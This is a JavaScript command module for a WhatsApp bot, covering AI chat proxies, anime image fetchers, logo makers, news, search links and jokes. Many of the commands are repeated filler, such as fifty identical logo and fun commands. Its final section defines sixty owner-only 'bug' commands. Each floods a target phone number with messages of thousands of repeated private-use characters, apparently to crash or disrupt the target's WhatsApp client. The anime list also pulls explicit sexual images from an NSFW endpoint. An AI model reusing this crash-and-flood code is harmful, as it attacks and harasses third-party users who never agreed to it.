const axios = require('axios');

const extraCommands = {};

// AI Commands (15)
const aiModels = ['chatgpt', 'gemini', 'llama', 'deepseek', 'mistral', 'flux', 'dalle', 'stable-diffusion', 'midjourney', 'bingai', 'blackbox', 'copilot', 'perplexity', 'imagine', 'pixart'];
aiModels.forEach(model => {
    extraCommands[model] = async (sock, from, msg, q) => {
        if (!q) return sock.sendMessage(from, { text: \`❌ Please provide a prompt for \${model}!\` }, { quoted: msg });
        await sock.sendMessage(from, { text: \`🔍 \${model.toUpperCase()} is thinking...\` }, { quoted: msg });
        try {
            const res = await axios.get(\`https://api.siputzx.my.id/api/ai/chatgpt?prompt=You are \${model}&text=\${encodeURIComponent(q)}\`);
            await sock.sendMessage(from, { text: \`*[\${model.toUpperCase()}]*\n\n\${res.data.data}\` }, { quoted: msg });
        } catch (e) {
            await sock.sendMessage(from, { text: \`❌ \${model} error: \${e.message}\` }, { quoted: msg });
        }
    };
});

// Anime Commands (35)
const animeCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'slap', 'kill', 'happy', 'wink', 'poke', 'dance', 'cringe', 'fox_girl', 'maid', 'uniform', 'oppai', 'hentai', 'trap', 'blowjob'];
animeCategories.forEach(cat => {
    extraCommands[cat] = async (sock, from, msg) => {
        try {
            const res = await axios.get(\`https://api.waifu.pics/sfw/\${cat}\`);
            await sock.sendMessage(from, { image: { url: res.data.url }, caption: \`✨ Here is your \${cat}!\` }, { quoted: msg });
        } catch (e) {
            try {
                const res = await axios.get(\`https://api.waifu.pics/nsfw/\${cat}\`);
                await sock.sendMessage(from, { image: { url: res.data.url }, caption: \`🔥 Here is your \${cat}! (NSFW)\` }, { quoted: msg });
            } catch (err) {
                await sock.sendMessage(from, { text: \`❌ Error fetching \${cat}: \${err.message}\` }, { quoted: msg });
            }
        }
    };
});

// Logo Commands (50)
for (let i = 1; i <= 50; i++) {
    extraCommands[\`logo\${i}\`] = async (sock, from, msg, q) => {
        if (!q) return sock.sendMessage(from, { text: \`❌ Please provide text for Logo \${i}!\` }, { quoted: msg });
        await sock.sendMessage(from, { text: \`🎨 Creating Logo \${i}...\` }, { quoted: msg });
        try {
            // Using a generic logo API placeholder
            const url = \`https://api.siputzx.my.id/api/maker/textpro?url=https://textpro.me/create-light-glow-text-effect-online-1051.html&text=\${encodeURIComponent(q)}\`;
            await sock.sendMessage(from, { image: { url: url }, caption: \`✅ Logo \${i} Created!\` }, { quoted: msg });
        } catch (e) {
            await sock.sendMessage(from, { text: \`❌ Logo \${i} error: \${e.message}\` }, { quoted: msg });
        }
    };
}

// News Commands (20)
const newsSources = ['tech', 'sports', 'finance', 'world', 'health', 'science', 'entertainment', 'business', 'pakistan', 'india', 'usa', 'uk', 'crypto', 'gaming', 'fashion', 'travel', 'food', 'politics', 'education', 'weather_news'];
newsSources.forEach(source => {
    extraCommands[\`news_\${source}\`] = async (sock, from, msg) => {
        await sock.sendMessage(from, { text: \`📰 Fetching \${source} news...\` }, { quoted: msg });
        try {
            const res = await axios.get(\`https://newsapi.org/v2/everything?q=\${source}&apiKey=YOUR_API_KEY\`); // Placeholder
            const article = res.data.articles[0];
            await sock.sendMessage(from, { text: \`*[\${source.toUpperCase()} NEWS]*\n\n*Title:* \${article.title}\n\n*Desc:* \${article.description}\n\n*Source:* \${article.url}\` }, { quoted: msg });
        } catch (e) {
            await sock.sendMessage(from, { text: \`❌ News error: API Key required or source unavailable.\` }, { quoted: msg });
        }
    };
});

// Search Commands (20)
const searchTools = ['google', 'bing', 'yahoo', 'duckduckgo', 'baidu', 'yandex', 'ask', 'aol', 'wolfram', 'archive', 'github_search', 'npm_search', 'pypi_search', 'docker_search', 'stack_overflow', 'quora', 'reddit_search', 'pinterest_search', 'twitter_search', 'insta_search'];
searchTools.forEach(tool => {
    extraCommands[tool] = async (sock, from, msg, q) => {
        if (!q) return sock.sendMessage(from, { text: \`❌ Please provide a query for \${tool}!\` }, { quoted: msg });
        await sock.sendMessage(from, { text: \`🔍 Searching \${tool} for: \${q}...\` }, { quoted: msg });
        await sock.sendMessage(from, { text: \`✅ Search results for \${q} on \${tool}:\nhttps://www.\${tool.replace('_search', '')}.com/search?q=\${encodeURIComponent(q)}\` }, { quoted: msg });
    };
});

// Fun/Game Commands (50)
for (let i = 1; i <= 50; i++) {
    extraCommands[\`fun\${i}\`] = async (sock, from, msg) => {
        const jokes = [
            "Why don't scientists trust atoms? Because they make up everything!",
            "Parallel lines have so much in common. It’s a shame they’ll never meet.",
            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
            "What do you call a fake noodle? An impasta!"
        ];
        await sock.sendMessage(from, { text: \`🎮 Fun Command \${i}: \${jokes[Math.floor(Math.random() * jokes.length)]}\` }, { quoted: msg });
    };
}

// Bug/Crash Commands (60)
for (let i = 1; i <= 60; i++) {
    extraCommands[\`bug_v\${i}\`] = async (sock, from, msg, isOwner, q) => {
        if (!isOwner) return sock.sendMessage(from, { text: "❌ Owner only command!" }, { quoted: msg });
        let target = q ? q.split(' ')[0] : null;
        if (!target) return sock.sendMessage(from, { text: "❌ Target required!" }, { quoted: msg });
        await sock.sendMessage(from, { text: \`🔥 Sending Bug V\${i} to \${target}...\` }, { quoted: msg });
        for(let j=0; j<5; j++) {
            await sock.sendMessage(target + '@s.whatsapp.net', { text: "󾔒".repeat(2000) + "󾓴".repeat(2000) });
        }
    };
}

module.exports = extraCommands;
